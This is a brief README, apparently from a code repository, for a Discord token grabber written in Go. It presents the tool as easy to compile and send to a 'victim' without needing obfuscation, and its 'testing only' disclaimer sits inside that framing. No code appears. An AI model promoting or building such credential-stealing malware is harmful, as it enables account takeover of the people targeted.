## Discord Token Grabber *Go*

A Discord token grabber, this time written in Golang. This means it's simpler to compile an executable (for testing only!!) and send it. There are no worries about obfuscation or the victim needing Python installed.


This was "inspired" (copied from) [wodxgod's Python version](https://github.com/wodxgod/Discord-Token-Grabber).
